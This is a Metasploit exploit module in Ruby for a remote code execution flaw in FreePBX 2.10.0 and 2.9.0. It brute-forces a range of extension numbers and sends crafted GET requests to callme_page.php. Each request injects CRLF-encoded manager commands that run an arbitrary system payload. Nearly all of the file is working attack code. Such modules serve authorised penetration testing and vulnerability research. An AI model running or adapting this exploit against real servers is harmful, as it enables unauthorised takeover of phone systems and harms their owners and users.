# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ManualRanking
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;FreePBX 2.10.0 / 2.9.0 callmenum Remote Code Execution&#039;,
            &#039;Description&#039;    => %q{
                This module exploits FreePBX version 2.10.0,2.9.0 and possibly older.
                Due to the way callme_page.php handles the &#039;callmenum&#039; parameter, it
                is possible to inject code to the &#039;$channel&#039; variable in function
                callme_startcall in order to gain remote code execution.
 
                Please note in order to use this module properly, you must know the
                extension number, which can be enumerated or bruteforced, or you may
                try some of the default extensions such as 0 or 200.  Also, the call
                has to be answered (or go to voice).
 
                Tested on both Elastix and FreePBX ISO image installs.
            },
            &#039;Author&#039;         => [ &#039;muts&#039;,&#039;Martin Tschirsich&#039; ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;References&#039;     =>
                [
                    [ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/18649/&#039; ]
                ],
            &#039;Platform&#039;       => [&#039;unix&#039;],
            &#039;Arch&#039;           => ARCH_CMD,
            &#039;Privileged&#039;     => false,
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;       => 1024,
                    &#039;DisableNops&#039; => true,
                },
            &#039;Targets&#039;        =>
                [
                    [ &#039;Automatic Target&#039;, { }]
                ],
            &#039;DefaultTarget&#039;  => 0,
            &#039;DisclosureDate&#039; => &#039;Mar 20 2012&#039;))
 
        register_options(
            [
                OptString.new("EXTENSION", [ true, "A range of Local extension numbers", "0-100" ]),
            ], self.class)
    end
 
    def exploit
        # Check range input
        if datastore[&#039;EXTENSION&#039;] =~ /^(\d+)\-(\d+)$/
            min = $1.to_i
            max = $2.to_i
        else
            print_error("Please specify a range for option &#039;EXTENSION&#039;")
            return
        end
 
        cmd = Rex::Text.uri_encode(payload.encoded)
 
        (min..max).each do |e|
            connect
            print_status("#{rhost}:#{rport} - Sending evil request with range #{e.to_s}")
            res = send_request_raw({
                &#039;method&#039; => &#039;GET&#039;,
                &#039;uri&#039; => "/recordings/misc/callme_page.php?action=c&callmenum="+e.to_s+"@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20#{cmd}%0D%0A%0D%0A",
                &#039;version&#039; => &#039;1.0&#039;,
                &#039;vhost&#039;   => rhost
            })
            handler
            disconnect
        end
    end
 
end



